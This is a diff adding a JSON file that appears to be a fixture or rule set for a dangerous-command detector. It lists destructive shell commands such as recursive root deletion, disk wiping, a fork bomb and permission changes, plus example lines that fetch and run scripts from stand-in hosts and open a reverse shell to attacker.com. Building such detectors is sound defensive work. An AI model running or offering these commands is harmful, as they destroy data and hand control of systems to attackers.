@@ -1,0 +1,128 @@
+{
+  "deletion": [
+    {
+      "command": "rm -rf /",
+      "description": "Delete entire filesystem",
+      "riskLevel": "CRITICAL",
+      "risks": ["Total system destruction", "Unrecoverable data loss"]
+    },
+    {
+      "command": "rm -rf /*",
+      "description": "Delete all root directories",
+      "riskLevel": "CRITICAL",
+      "risks": ["System destruction", "Data loss"]
+    },
+    {
+      "command": "rm -rf ~",
+      "description": "Delete user home directory",
+      "riskLevel": "HIGH",
+      "risks": ["Personal data loss", "Configuration loss"]
+    },
+    {
+      "command": "find / -name \"*.log\" -delete",
+      "description": "Delete all log files system-wide",
+      "riskLevel": "HIGH",
+      "risks": ["Audit trail loss", "Debugging difficulty"]
+    }
+  ],
+  "system_damage": [
+    {
+      "command": "dd if=/dev/zero of=/dev/sda",
+      "description": "Overwrite primary disk with zeros",
+      "riskLevel": "CRITICAL",
+      "risks": ["Disk destruction", "Unbootable system"]
+    },
+    {
+      "command": "mkfs.ext4 /dev/sda1",
+      "description": "Format system partition",
+      "riskLevel": "CRITICAL",
+      "risks": ["Partition data loss", "System corruption"]
+    },
+    {
+      "command": ":(){ :|:& };:",
+      "description": "Fork bomb",
+      "riskLevel": "HIGH",
+      "risks": ["System freeze", "Resource exhaustion"]
+    }
+  ],
+  "permission_changes": [
+    {
+      "command": "chmod -R 777 /",
+      "description": "Make entire system world-writable",
+      "riskLevel": "CRITICAL",
+      "risks": ["Security breach", "System compromise"]
+    },
+    {
+      "command": "chmod 000 /bin/*",
+      "description": "Remove all permissions from system binaries",
+      "riskLevel": "CRITICAL",
+      "risks": ["System unusable", "Cannot execute commands"]
+    },
+    {
+      "command": "chown -R nobody:nobody /",
+      "description": "Change ownership of entire system",
+      "riskLevel": "CRITICAL",
+      "risks": ["Access loss", "System compromise"]
+    }
+  ],
+  "network_risks": [
+    {
+      "command": "curl http://malicious.com/script.sh | sudo bash",
+      "description": "Execute remote script with sudo",
+      "riskLevel": "CRITICAL",
+      "risks": ["Remote code execution", "System compromise"]
+    },
+    {
+      "command": "nc -e /bin/bash attacker.com 4444",
+      "description": "Reverse shell",
+      "riskLevel": "CRITICAL",
+      "risks": ["Remote access", "System compromise"]
+    },
+    {
+      "command": "wget -O - http://evil.com/payload | sh",
+      "description": "Download and execute remote payload",
+      "riskLevel": "CRITICAL",
+      "risks": ["Malware infection", "Data exfiltration"]
+    }
+  ],
+  "sudo_commands": [
+    {
+      "command": "sudo rm /etc/passwd",
+      "description": "Delete password file",
+      "riskLevel": "CRITICAL",
+      "risks": ["Authentication broken", "System lockout"]
+    },
+    {
+      "command": "sudo visudo",
+      "description": "Edit sudoers file",
+      "riskLevel": "HIGH",
+      "risks": ["Privilege escalation", "Security configuration"]
+    },
+    {
+      "command": "sudo apt-get remove --purge systemd",
+      "description": "Remove init system",
+      "riskLevel": "CRITICAL",
+      "risks": ["System unbootable", "Core functionality loss"]
+    }
+  ],
+  "data_corruption": [
+    {
+      "command": "> /etc/hosts",
+      "description": "Truncate hosts file",
+      "riskLevel": "HIGH",
+      "risks": ["Network resolution broken", "Service failures"]
+    },
+    {
+      "command": "echo 'corrupt' > /boot/grub/grub.cfg",
+      "description": "Corrupt bootloader config",
+      "riskLevel": "CRITICAL",
+      "risks": ["System unbootable", "Recovery needed"]
+    },
+    {
+      "command": "sed -i 's/root/toor/g' /etc/passwd",
+      "description": "Modify system users",
+      "riskLevel": "CRITICAL",
+      "risks": ["Authentication broken", "Access loss"]
+    }
+  ]
+}
